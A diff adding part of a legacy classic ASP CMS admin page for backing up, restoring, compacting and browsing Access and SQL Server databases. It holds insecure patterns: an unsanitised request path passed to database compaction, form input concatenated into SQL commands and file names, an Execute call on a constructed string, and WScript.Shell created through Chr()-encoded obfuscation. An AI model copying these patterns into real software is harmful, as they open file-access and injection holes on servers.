+		</td>
+	</tr>
+	<tr>
+		<td class="tablerow2">
+			&nbsp;&nbsp;在上面填写本程序的数据库路径全名，本程序的默认备份数据库文件在DataBackup目录下，请按照您的备份文件自行修改。<br/>
+			&nbsp;&nbsp;您可以用这个功能来备份您的法规数据，以保证您的数据安全！<br/>
+			&nbsp;&nbsp;注意：所有路径都是相对与程序空间根目录的相对路径。<br/>
+			&nbsp;&nbsp;<font color="blue">建议使用之前所下载的备份数据库,替换原来的数据库即可。</font><br/>
+		</td>
+	</form>
+</table>
+<%
+	End If
+End Sub
+'====================备份数据库=========================
+Sub BackupData()
+	If AskIsSqlDataBase = 1 Then
+%>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+	<tr>
+		<th>备份SQL数据</th>
+	</tr>
+	<form name="form1" method="post" action="?action=BackupData&act=Backup">
+	<tr>
+		<td class="tablerow1">
+			&nbsp;&nbsp;
+			当前SQL数据库名称：<input type="text" size="35" name="SqlDataName" value="******" disabled><br/>&nbsp;&nbsp;
+			SQL数据库用户名称：<input type="text" size="35" name="SqlUserID" value="******" disabled>&nbsp;请输入您的SQL数据库用户名<br/>&nbsp;&nbsp;
+			SQL数据库用户密码：<input type="Password" size="35" name="SqlUserPass" value="******" disabled>&nbsp;请输入您的SQL数据库连接密码<br/>&nbsp;&nbsp;
+			SQL数据库服务器名：<input type="text" size="35" name="SqlServer" value="(local)" disabled>&nbsp;连接服务器名（本地用local，外地用IP）<br/>&nbsp;&nbsp;
+			备份SQL数据库目录：<input type="text" size="35" name="BackupSqlDir" value="Databackup" disabled>&nbsp;如目录不存在，程序将自动创建<br/>&nbsp;&nbsp;
+			备份SQL数据库名称：<input type="text" size="35" name="BackupSqlName"  value="newasp_<%=RanDataName%>">&nbsp;不需要填写扩展名<br/>
+			&nbsp;&nbsp;<input type="submit" value="备份数据库" class="button"><br/>
+		</td>
+	</tr>
+	<tr>
+		<td class="tablerow2">
+			<b>说明：</b><br/>
+			&nbsp;&nbsp;您可以用这个功能来备份您的法规数据，以保证您的数据安全！<br/>
+			&nbsp;&nbsp;注意：程序和SQL数据库必需在同一台服务器才能备份，备份数据库不一定能成功。<br/>
+			&nbsp;&nbsp;<font color="blue">建议登录服务器使用SQL企业管理器进行备份，建议每周备份一次以上。</font><br/>
+			&nbsp;&nbsp;<a href="?action=Readme">>>更多SQL数据库数据处理说明</a>
+		</td>
+	</tr>
+	</form>
+</table>
+<%
+Else
+%>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+	<tr>
+		<th>备份系统数据 ( 需要FSO支持，FSO相关帮助请看微软网站 )</th>
+	</tr>
+	<form name="form1" method="post" action="?action=BackupData&act=Backup">
+	<tr>
+		<td class="tablerow1">
+			&nbsp;&nbsp;
+			当前数据库路径(相对路径)：<input type="text" size="65" name="DBpath" value="<%=mdbPath%>" disabled><br/>&nbsp;&nbsp;
+			备份数据库目录(相对路径)：<input type="text" size="35" name="bkfolder" value="../Databackup" disabled>&nbsp;如目录不存在，程序将自动创建<br/>&nbsp;&nbsp;
+			备份数据库名称(填写名称)：<input type="text" size="65" name="bkDBname" value="newasp_backup_<%=RanDataName%>.mdb"><br/>
+			&nbsp;&nbsp;<input type="submit" value="备份数据库" class="button">
+		</td>
+	</tr>
+	<tr>
+		<td class="tablerow2">
+			<b>说明：</b><br/>
+			&nbsp;&nbsp;在上面填写本程序的数据库路径全名，本程序的默认数据库文件为<%=mdbPath%>，<B>请一定不能用默认名称命名备份数据库</B><br/>
+			&nbsp;&nbsp;您可以用这个功能来备份您的法规数据，以保证您的数据安全！<br/>
+			&nbsp;&nbsp;注意：所有路径都是相对与程序空间管理目录的相对路径；备份的数据库名为*.bak<br/>
+			&nbsp;&nbsp;<font color="blue">建议使用FTP软件登录FTP站点，下载所需备份的数据库，保存到本地电脑存放，建议每周备份一次以上。</font><br />
+		</td>
+	</tr>
+	</form>
+</table>
+<%
+	End If
+End Sub
+'====================压缩数据库 =========================
+Sub CompressData()
+	If AskIsSqlDataBase = 1 Then
+%>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+	<tr>
+		<th>压缩SQL数据</th>
+	</tr>
+	<form name="form1" method="post" action="?action=CompressData&act=Compress">
+	<tr>
+		<td class="tablerow1">
+			&nbsp;&nbsp;
+			当前SQL数据库名称：<input type="text" size="35" name="SqlDataName" value="******"><br/>&nbsp;&nbsp;
+			SQL数据库用户名称：<input type="text" size="35" name="SqlUserID" value="******">&nbsp;请输入您的SQL数据库用户名<br/>&nbsp;&nbsp;
+			SQL数据库用户密码：<input type="Password" size="35" name="SqlUserPass" value="******">&nbsp;请输入您的SQL数据库连接密码<br/>&nbsp;&nbsp;
+			SQL数据库服务器名：<input type="text" size="35" name="SqlServer" value="(local)">&nbsp;连接服务器名（本地用local，外地用IP）<br/>&nbsp;&nbsp;
+			压缩其它SQL数据库：<input type="checkbox" id="checkdata" name="checkdata" value="ok" /> &nbsp;<font color="blue">如果压缩现在使用的数据库，上面的信息可以不用填</font><br/>&nbsp;&nbsp;
+			&nbsp;&nbsp;<input type="submit" value="压缩数据库" class="button">
+			&nbsp;&nbsp;MsSQL数据库版本：<input type="radio" name="MsSQLVersion" value="2000" checked="checked" /> SQL2000
+			<input type="radio" name="MsSQLVersion" value="2005" /> SQL2005
+		</td>
+	</tr>
+	<tr>
+	<td class="tablerow2"><b>说明：</b><br/>
+		&nbsp;&nbsp;数据库文件在使用过程中，由于内容的增删，数据库和日志会有所增大，需要对数据库和日志进行压缩处理。<br />
+		&nbsp;&nbsp;<a href="?action=Readme">>>更多SQL数据库数据处理说明</a>
+	</td>
+</tr>
+	</form>
+</table>
+<%
+Else
+%>
+<script language="JavaScript">
+<!--
+function selectBrowse(){
+	if(!detectMacXFF()){
+		var ss=showModalDialog('admin_data.asp?action=browse', 'self', 'dialogWidth:800px; dialogHeight:600px; help: no; scroll: yes; status: no');
+		if(ss!=null) document.form1.dbpath.value='../DataBackup/'+ss;
+	}else{
+		var feature="width=800,height=600,menubar=no,toolbar=no,location=no,";
+		feature+="scrollbars=yes,resizable=yes,status=no,modal=yes";
+		window.open('admin_data.asp?action=browse',null,feature);
+	}
+}
+
+function return_value(txt){
+	if(!detectMacXFF()){
+		window.returnValue='../DataBackup/'+txt;
+	}else{
+	   parent.opener.document.form1.dbpath.value='../DataBackup/'+txt;
+   }
+   top.close();
+}
+//-->
+</script>
+<table border="0"  cellspacing="1" cellpadding="3" align="center" class="tableborder">
+<tr>
+	<th>压缩数据库 ( 需要FSO支持，FSO相关帮助请看微软网站 )</th>
+</tr>
+<form name="form1" action="?action=CompressData&act=Compress" method="post">
+<tr>
+	<td class="tablerow1"><b>注意：</b><br>输入数据库所在相对路径,并且输入数据库名称（正在使用中数据库不能压缩，请选择备份数据库进行压缩操作） </td>
+</tr>
+<tr>
+	<td class="tablerow2">压缩数据库：<input type="text" id="dbpath" name="dbpath" size="65" value="../Databackup/newasp_backup.mdb">&nbsp;
+	<input type="button" name="selectbrowse" value=" 浏览... " onclick="selectBrowse()" class="button">&nbsp;
+	<input type="submit" value="开始压缩" class="button"></td>
+</tr>
+<tr>
+	<td class="tablerow1"><input type="checkbox" name="boolIs97" value="True">如果使用 Access 97 数据库请选择
+	(默认为 Access 2000 数据库)<br><br></td>
+</tr>
+<tr>
+	<td class="tablerow2"><b>说明：</b><br/>
+		&nbsp;&nbsp;数据库文件在使用过程中，由于内容的增删，文件尺寸会有所增大，需要对其进行压缩修复。建议使用Microsoft Access压缩修复数据库<br />
+		&nbsp;&nbsp;下载数据库文件[如果是.asp的扩展名，请改为.mdb的扩展名]，用Microsoft Access打开数据库，选择工具--数据库实用工具--压缩和修复数据库--[改回.asp的扩展名]--上传覆盖原来数据库文件<br />
+		&nbsp;&nbsp;<b>Access2007</b> 修复方法：选择菜单→系统管理→数据库管理→数据库修复压缩，系统将自动修复压缩数据库文件。
+	</td>
+</tr>
+<form>
+</table>
+<%
+	End If
+End Sub
+
+Sub selectBrowseJS()
+%>
+<script language="JavaScript">
+<!--
+function selectBrowse(){
+	if(!detectMacXFF()){
+		var ss=showModalDialog('admin_data.asp?action=browse', 'self', 'dialogWidth:800px; dialogHeight:600px; help: no; scroll: yes; status: no');
+		if(ss!=null) document.form1.backpath.value=ss;
+	}else{
+		var feature="width=800,height=600,menubar=no,toolbar=no,location=no,";
+		feature+="scrollbars=yes,resizable=yes,status=no,modal=yes";
+		window.open('admin_data.asp?action=browse',null,feature);
+	}
+}
+
+function return_value(txt){
+	if(!detectMacXFF()){
+		window.returnValue=txt;
+	}else{
+	   parent.opener.document.form1.backpath.value = txt;
+   }
+   top.close();
+}
+//-->
+</script>
+<%
+End Sub
+
+Sub browseBackupFolder()
+	Dim fullPath
+	Dim fso, FileCount, totalPut
+	fullPath = Server.MapPath("../Databackup")
+	On Error Resume Next
+	If Not InstallObjTest(FSOClassID,"") Then
+		Response.Write "<b><font color=""red"">你的服务器不支持 FSO(Scripting.FileSystemObject)! 不能使用本功能</font></b>"
+		Exit Sub
+	End If
+	Set fso = NewAsp.CreateAXObject(FSOClassID)
+	If fso.FolderExists(fullPath) Then
+		Dim fsoFile,dirFileName
+		Dim DirFiles, DirFolder
+		Set fsoFile = fso.GetFolder(fullPath)
+		totalPut = fsoFile.Files.Count
+		'--设置浏览脚本
+		Call selectBrowseJS()
+		FileCount = 0
+		Response.Write "<table border=""0"" align=""center"" cellpadding=""3"" cellspacing=""1"" class=""tableborder"">" & vbNewLine
+		Response.Write "<tr><th colspan=""2"">浏览备份数据库</th></tr>" & vbNewLine
+		Response.Write "<tr>" & vbNewLine
+		For Each DirFiles In fsoFile.Files
+			dirFileName = DirFiles.Name
+			Response.Write "<td class=""tablerow1"">"
+			Response.Write "文 件 名：<a href=""#"" onClick=""return_value('" & dirFileName & "')"" title=""点击文件名自动返回"">" & DirFiles.Name & "</a><br/>"
+			Response.Write "文件大小：" & cSize(DirFiles.Size) & "<br/>"
+			Response.Write "文件类型：" & DirFiles.Type & "<br/>"
+			Response.Write "修改时间：" & DirFiles.DateLastModified & "<br/>"
+			Response.Write "操作选项：<a href=""?action=del&filename=" & dirFileName & """ onclick=""return confirm('您确定要删除此文件吗!');"" title=""点击删除文件""><b><font color=""red"">× 删除</font></b></a>&nbsp;&nbsp;"
+			Response.Write "<a href=""#"" onClick=""return_value('" & dirFileName & "')"" title=""点击自动返回""><b>√ 选择</b></a>&nbsp;&nbsp;"
+			FileCount = FileCount + 1
+			Response.Write "</td>" & vbNewLine
+			If FileCount=totalPut And (totalPut Mod 2) <> 0 Then
+				Response.Write "<td class=""tablerow1"">&nbsp;</td>" & vbNewLine
+			End If
+			If (FileCount Mod 2) = 0 Then
+				Response.Write "</tr>" & vbNewLine & "<tr>" & vbNewLine
+			End If
+
+		Next
+		Response.Write "</tr>" & vbNewLine
+		Response.Write "</table>"
+	Else
+		Response.Write "没有任何备份文件！"
+	End If
+	Set fsoFile = Nothing: Set fso = Nothing
+End Sub
+
+Sub deleteBackupFile()
+	On Error Resume Next
+	Dim fso,FileName,FilePath
+	FileName = Replace(Replace(Replace(Request("FileName"), "../", ""), "..\", ""), "'", "")
+	FilePath = Server.MapPath("../Databackup") & "\" & FileName
+	Set fso = NewAsp.CreateAXObject(FSOClassID)
+	If fso.FileExists(FilePath) Then
+		fso.DeleteFile FilePath, True
+	End If
+	Set fso = Nothing
+	Succeed("<li>"& FileName &", 文件删除成功!</li>")
+	If Err.Number <> 0 Then Err.Clear
+End Sub
+
+
+Function GetFileSize(FileName)
+	Dim fso,drvpath,d,size,showsize
+	Set fso=NewAsp.CreateAXObject(FSOClassID)
+	drvpath=ChkMapPath(FileName)
+	Set d=fso.getfile(drvpath)
+	size=d.size
+	showsize=size & "&nbsp;Byte"
+	If size>1024 Then
+	   size=(Size/1024)
+	   showsize=size & "&nbsp;KB"
+	End If
+	If size>1024 Then
+	   size=(size/1024)
+	   showsize=formatnumber(size,2) & "&nbsp;MB"
+	End If
+	If size>1024 Then
+	   size=(size/1024)
+	   showsize=formatnumber(size,2) & "&nbsp;GB"
+	End If
+	Set fso=Nothing
+	GetFileSize = showsize
+End Function
+
+Sub GetSysInfo()
+	On Error Resume Next
+	Dim WshShell,WshSysEnv
+	Set WshShell = NewAsp.CreateAXObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))
+	Set WshSysEnv = WshShell.Environment("SYSTEM")
+	okOS = Cstr(WshSysEnv("OS"))
+	okCPUS = Cstr(WshSysEnv("NUMBER_OF_PROCESSORS"))
+	okCPU = cstr(WshSysEnv("PROCESSOR_IDENTIFIER"))
+	Set WshSysEnv = Nothing
+	Set WshShell = Nothing
+	If IsNull(okCPUS) Then
+		okCPUS = Request.ServerVariables("NUMBER_OF_PROCESSORS")
+	ElseIf okCPUS="" Then
+		okCPUS = Request.ServerVariables("NUMBER_OF_PROCESSORS")
+	End If
+
+	okIIS = Request.ServerVariables("SERVER_SOFTWARE")
+	If Len(okIIS) > 1 And Len(Request.ServerVariables("OS")) = 0 Then
+		If InStr(okIIS,"/5.0") > 0 Then
+			okOS="Windows Server 2000"
+		ElseIf InStr(okIIS,"/5.1") > 0 Then
+			okOS= "Windows XP"
+		ElseIf InStr(okIIS,"/6.0") > 0 Then
+			okOS="Windows Server 2003"
+		ElseIf InStr(okIIS,"/7.0") > 0 Then
+			okOS="Windows Server 2008"
+		Else
+			okOS=okOS & "(可能是最新版 Windows)"
+		End If
+	End If
+	If Len(okOS) = 0 Then
+		okOS = Request.ServerVariables("OS")
+		If Len(okOS) = 0 Then okOS="Windows NT"
+	End If
+	If Err.Number <> 0 Then Err.Clear
+End Sub
+
+'检查组件是否被支持及组件版本的子程序okVersion
+Function InstallObjTest(strObj,okVersion)
+	On Error Resume Next
+	Dim TestObj
+	InstallObjTest = False
+	okVersion = ""
+	okExpires = ""
+	Err = 0
+	Set TestObj = NewAsp.CreateAXObject(strObj)
+	If 0 = Err Then
+		InstallObjTest = True
+		okVersion = TestObj.version
+		If okVersion="" Or IsNull(okVersion) Then okVersion=TestObj.about
+		'If strObj="Persits.Upload" Then
+		'	okExpires=" -- "&TestObj.Expires
+		'Else
+		'	If strObj="Persits.Jpeg" Then okExpires=" -- "&TestObj.Expires Else okExpires = ""
+		'End If
+		If strObj="Persits.Upload" Then okExpires=" -- "&TestObj.Expires
+		If strObj="Persits.Jpeg" Then okExpires=" -- "&TestObj.Expires
+		If strObj="Persits.MailSender" Then okExpires=" -- "&TestObj.Expires
+	End If
+	Set TestObj=Nothing
+	If Err.Number <> 0 Then Err.Clear
+	Err = 0
+End Function
+
+Function CheckObjTest(objid)
+	Dim okVersion
+	If Not InstallObjTest(objid,okVersion) Then
+		CheckObjTest = "<font color=""#ff0066""><strong>&times;</strong></font>"
+	Else
+		CheckObjTest = "<strong>&radic;</strong> " & okVersion & okExpires
+	End If
+End Function
+
+' 检测不安全组件
+Function CheckOkObj(ByVal runstr)
+	On Error Resume Next
+	Response.Write "<span style=""display:none"">"
+	CheckOkObj = True
+	Err = 0
+	Execute runstr & ".exec()"
+	If 429 = Err Then
+		CheckOkObj = False
+	End If
+	If Err.Number <> 0 Then Err.Clear
+	Err = 0
+	Response.Write "</span>"
+	If CheckOkObj Then
+		CheckOkObj="<font color=""red"">√ 危险</font>"
+	Else
+		CheckOkObj="<font color=""green"">× 安全</font>"
+	End If
+
+End Function
+
+Function cDrivetype(tnum)
+    Select Case tnum
+        Case 0: cdrivetype = "未知"
+        Case 1: cdrivetype = "可移动磁盘"
+        Case 2: cdrivetype = "本地磁盘"
+        Case 3: cdrivetype = "网络磁盘"
+        Case 4: cdrivetype = "CD-ROM"
+        Case 5: cdrivetype = "RAM 磁盘"
+    End Select
+End Function
+
+Function cVolumeName(tvn)
+	If Not IsNull(tvn) And tvn<>"" Then
+		cVolumeName = tvn
+	Else
+		cVolumeName = "本地磁盘"
+	End If
+End Function
+
+Function cFileSystem(tfs)
+	If Not IsNull(tfs) And tfs<>"" Then
+		cFileSystem = tfs
+	Else
+		cFileSystem = "&nbsp;"
+	End If
+End Function
+
+Function cIsReady(trd)
+    Select Case trd
+		case True: cIsReady="<font class=""fonts""><b>√</b></font>"
+		case False: cIsReady="<font color=""red""><b>×</b></font>"
+	End Select
+End Function
+
+Function cSize(ByVal tSize)
+	On Error Resume Next
+	If tSize<>"" And IsNumeric(tSize) Then
+		If tSize>=1099511627776 Then
+			cSize=Int((tSize/1099511627776)*1000)/1000 & " TB"
+		ElseIf tSize>=1073741824 Then
+			cSize=Int((tSize/1073741824)*1000)/1000 & " GB"
+		Elseif tSize>=1048576 Then
+			cSize=Int((tSize/1048576)*1000)/1000 & " MB"
+		Elseif tSize>=1024 Then
+			cSize=Int((tSize/1024)*1000)/1000 & " KB"
+		Else
+			cSize=tSize & "Byte"
+		End If
+	Else
+		cSize="未知"
+	End If
+End Function
+
+Sub BackupDatabase()
+	Dim fso,Dbpath,bkfolder,bkdbname
+	On Error Resume Next
+	Dbpath = mdbPath'Replace(Request.Form("Dbpath"), "//", "/")
+	If InStr(Dbpath, ":") = 0 Then
+		Dbpath = Server.MapPath(Dbpath)
+	Else
+		Dbpath = Dbpath
+	End If
+	bkfolder = "../Databackup"
+	bkdbname = Trim(Request.Form("bkdbname"))&".bak"
+	Set fso = NewAsp.CreateAXObject(FSOClassID)
+	If fso.FileExists(dbpath) Then
+		If CheckDir(bkfolder) = True Then
+			fso.CopyFile dbpath, bkfolder& "\"& bkdbname
+		Else
+			MakeNewsDir bkfolder
+			fso.CopyFile dbpath, bkfolder& "\"& bkdbname
+		End If
+		Succeed("<li>备份数据库成功，您备份的数据库路径为" &bkfolder& "\"& bkdbname & "</li>")
+	Else
+		FoundErr = True
+		ErrMsg = "<li>找不到您所需要备份的文件。</li>"
+	End If
+	Set fso = Nothing
+End Sub
+
+Sub RestoreDatabase()
+	Dim backpath,Dbpath,fso
+	Dbpath = mdbPath'Replace(Request.Form("Dbpath"), "//", "/")
+	backpath = "../Databackup/" & Replace(Replace(Replace(Request.Form("backpath"), "/", ""), "\", ""), "'", "")
+	If backpath = "" Then
+		FoundErr = True
+		ErrMsg = "<li>请输入您要恢复成的数据库名</li>"
+		Exit Sub
+	End If
+	If InStr(Lcase(backpath),".asp")>0 Or InStr(Lcase(backpath),".aspx")>0 Or InStr(Lcase(backpath),".php")>0 Then
+		FoundErr = True
+		ErrMsg = "<li>保存数据库名不合法,必须是有效的MDB文件!</li>"
+		Exit Sub
+	End If
+
+	If Lcase(Mid(backpath,instrRev(backpath,".")+1))<>"mdb" And Lcase(Mid(backpath,instrRev(backpath,".")+1))<>"bak" Then
+		FoundErr = True
+		ErrMsg = "<li>保存数据库名不合法，不是有效的*.MDB文件</li>"
+		Exit Sub
+	End If
+	If InStr(Dbpath, ":") = 0 Then
+		Dbpath = Server.MapPath(Dbpath)
+	Else
+		Dbpath = Dbpath
+	End If
+	If InStr(backpath, ":") = 0 Then
+		backpath = Server.MapPath(backpath)
+	Else
+		backpath = backpath
+	End If
+	Set fso = NewAsp.CreateAXObject(FSOClassID)
+	If fso.FileExists(dbpath) Then
+		fso.CopyFile Backpath,Dbpath
+		Succeed("成功恢复数据！")
+	Else
+		FoundErr = True
+		ErrMsg = "<li>备份目录下并无您的备份文件！</li>"
+	End If
+	Set fso = Nothing
+End Sub
+'------------------检查某一目录是否存在-------------------
+Function CheckDir(FolderPath)
+	Dim fso
+	On Error Resume Next
+	folderpath = Server.MapPath(folderpath)
+	Set fso = NewAsp.CreateAXObject(FSOClassID)
+	If fso.FolderExists(FolderPath) Then
+		'存在
+		CheckDir = True
+	Else
+		'不存在
+		CheckDir = False
+	End If
+	Set fso = Nothing
+End Function
+'-------------根据指定名称生成目录-----------------------
+Function MakeNewsDir(foldername)
+	Dim fso
+	On Error Resume Next
+	Set fso = NewAsp.CreateAXObject(FSOClassID)
+	If fso.FolderExists(foldername) = False Then
+		fso.CreateFolder foldername
+	End If
+	MakeNewsDir = True
+	Set fso = Nothing
+End Function
+Sub CompressDatabase()
+	Dim dbpath, boolIs97
+	dbpath = Replace(Request("dbpath"), "//", "/")
+	boolIs97 = Request("boolIs97")
+
+	If dbpath <> "" Then
+		If InStr(Dbpath, ":") = 0 Then
+			Dbpath = Server.MapPath(Dbpath)
+		Else
+			Dbpath = Dbpath
+		End If
+		Response.Write(CompactDB(dbpath, boolIs97))
+	Else
+		FoundErr = True
+		ErrMsg = "<li>请输入要压缩的数据库路径！</li>"
+		Exit Sub
+	End If
+End Sub
+'=====================压缩参数=========================
+Function CompactDB(dbPath, boolIs97)
+	Dim fso, Engine, strDBPath, JET_3X
+	strDBPath = Left(dbPath, instrrev(DBPath, "\"))
+	Set fso = NewAsp.CreateAXObject(FSOClassID)
+
+	If fso.FileExists(dbPath) Then
+		fso.CopyFile dbpath, strDBPath & "temp.mdb"
+		Set Engine = NewAsp.CreateAXObject("JRO.JetEngine")
+
+		If boolIs97 = "True" Then
+			Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strDBPath & "temp.mdb", _
+				"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strDBPath & "temp1.mdb;" _
+				& "Jet OLEDB:Engine Type=" & JET_3X
+		Else
+			Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strDBPath & "temp.mdb", _
+				"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strDBPath & "temp1.mdb"
+		End If
+
+		fso.CopyFile strDBPath & "temp1.mdb", dbpath
+		fso.DeleteFile(strDBPath & "temp.mdb")
+		fso.DeleteFile(strDBPath & "temp1.mdb")
+		Set Engine = Nothing
+		Succeed("<li>你的数据库, " & dbpath & ", 已经压缩成功!</li>")
+	Else
+		FoundErr = True
+		ErrMsg = "<li>数据库名称或路径不正确. 请重试!</li>"
+	End If
+	Set fso = Nothing
+End Function
+'====================备份SQL数据库=========================
+Sub BackupSqlDatabase()
+	On Error Resume Next
+	Dim bkdbPath
+	bkfolder = "../Databackup"
+	bkdbname = Replace(Replace(Trim(Request.Form("BackupSqlName")), "/", ""), "\", "") & ".bak"
+	If Len(bkdbname) = 0 Then
+		FoundErr = True
+		ErrMsg = "<li>备份SQL数据库名称不能为空!</li>"
+		Exit Sub
+	End If
+	If Not CheckDir(bkfolder) Then
+		MakeNewsDir bkfolder
+	End If
+	bkdbPath = bkfolder& "\"& bkdbname
+	NewAsp.Ask_Execute ("backup database [" & Ask_SqlDatabaseName & "] to disk='" & bkdbPath & "'")
+	If Err Then
+		FoundErr = True
+		ErrMsg = "<li>备份SQL数据库失败!</li><li>错误："& Err.Source & "," & Err.Description & "</li>"
+		Exit Sub
+	Else
+		Succeed("<li>备份SQL数据库成功，您备份的数据库路径为" & bkdbPath & "</li>")
+	End If
+End Sub
+'====================恢复SQL数据库=========================
+Sub RestoreSqlDatabase()
+	On Error Resume Next
+	Dim bkdbPath
+	bkfolder = "../Databackup"
+	bkdbname = Replace(Replace(Trim(Request.Form("BackupSqlName")), "/", ""), "\", "")
+	If Len(bkdbname) = 0 Then
+		FoundErr = True
+		ErrMsg = "<li>SQL备份数据库名称不能为空!</li>"
+		Exit Sub
+	End If
+	If InStr(Lcase(bkdbname),".asp")>0 Or InStr(Lcase(bkdbname),".aspx")>0 Or InStr(Lcase(bkdbname),".php")>0 Then
+		FoundErr = True
+		ErrMsg = "<li>保存数据库名不合法,必须是有效的bak文件!</li>"
+		Exit Sub
+	End If
+
+	If Lcase(Mid(bkdbname,instrRev(bkdbname,".")+1))<>"bak" Then
+		FoundErr = True
+		ErrMsg = "<li>保存SQL数据库名不合法，不是有效的*.bak备份文件</li>"
+		Exit Sub
+	End If
+	bkdbPath = Server.MapPath(bkfolder& "\"& bkdbname)
+	NewAsp.Ask_Execute ("restore database [" & Ask_SqlDatabaseName & "] from disk='" & bkdbPath & "' with file=1")
+	If Err Then
+		FoundErr = True
+		ErrMsg = "<li>SQL数据库恢复失败!</li><li>错误："& Err.Source & "," & Err.Description & "</li>"
+		Exit Sub
+	Else
+		Succeed("<li>SQL数据库恢复成功！</li>")
+	End If
+End Sub
+'====================压缩SQL数据库=========================
+Sub CompressSqlDatabase()
+	On Error Resume Next
+	Dim SqlDataName, SqlUserPass, SqlUserID, SqlServer
+	Dim con,constr,MsSQLVersion
+	MsSQLVersion=NewAsp.ChkNumeric(Request.Form("MsSQLVersion"))
+	If Request.Form("checkdata") = "ok" Then
+		SqlDataName = NewAsp.CheckStr(Trim(Request.Form("SqlDataName")))
+		SqlUserPass = NewAsp.CheckStr(Trim(Request.Form("SqlUserPass")))
+		SqlUserID = NewAsp.CheckStr(Trim(Request.Form("SqlUserID")))
+		SqlServer = NewAsp.CheckStr(Trim(Request.Form("SqlServer")))
+		constr = "Provider = Sqloledb; User ID = " & SqlUserID & "; Password = " & SqlUserPass & "; Initial Catalog = " & SqlDataName & "; Connect Timeout=600; Data Source = " & SqlServer & ";"
+		Set con = NewAsp.CreateAXObject("ADODB.Connection")
+		con.Open constr
+		If Err Then
+			Set con = Nothing
+			FoundErr = True
+			ErrMsg = "<li>你填写的SQL数据库连接信息有误!</li><li>错误："& Err.Source & "," & Err.Description & "</li>"
+			Exit Sub
+		End If
+		If MsSQLVersion=2005 Then
+			con.Execute ("DBCC SHRINKDATABASE(N'" & SqlDataName & "' )")
+		Else
+			con.Execute ("BACKUP LOG [" & SqlDataName & "] WITH NO_LOG")
+			con.Execute ("BACKUP LOG [" & SqlDataName & "] WITH TRUNCATE_ONLY")
+			con.Execute ("DBCC SHRINKDATABASE(N'" & SqlDataName & "' )")
+		End If
+		If Err Then
+			FoundErr = True
+			ErrMsg = "<li>SQL数据库压缩失败!</li><li>错误："& Err.Source & "," & Err.Description & "</li>"
+		Else
+			Succeed("<li>SQL数据库压缩成功！</li>")
+		End If
+		con.close
+		Set con = Nothing
+	Else
+		If MsSQLVersion=2005 Then
+			NewAsp.Ask_Execute ("DBCC SHRINKDATABASE(N'" & Ask_SqlDatabaseName & "' )")
+			'NewAsp.Ask_Execute ("DBCC SHRINKFILE(N'" & Ask_SqlDatabaseName & "' , 0, TRUNCATEONLY)")
+		Else
+			NewAsp.Ask_Execute ("BACKUP LOG [" & Ask_SqlDatabaseName & "] WITH NO_LOG")
+			NewAsp.Ask_Execute ("BACKUP LOG [" & Ask_SqlDatabaseName & "] WITH TRUNCATE_ONLY")
+			NewAsp.Ask_Execute ("DBCC SHRINKDATABASE(N'" & Ask_SqlDatabaseName & "' )")
+		End If
+		If Err Then
+			FoundErr = True
+			ErrMsg = "<li>SQL数据库压缩失败!</li><li>错误："& Err.Source & "," & Err.Description & "</li>"
+			Exit Sub
+		Else
+			Succeed("<li>SQL数据库压缩成功！</li>")
+		End If
+	End If
+End Sub
+
+Function RanDataName()
+	Dim RanNum,TempStr
+	Randomize
+	RanNum = Int(90000*rnd)+10000
+	TempStr = Year(now) & Month(now) & Day(now) & Hour(now) & Minute(now) & Second(now) & RanNum
+	RanDataName = TempStr
+End Function
+%>
+<script language="JScript" runat="server">
+function getJVer(){
+  //获取JScript 版本
+  return ScriptEngineMajorVersion() +"."+ScriptEngineMinorVersion()+"."+ ScriptEngineBuildVersion();
+}
+</script>
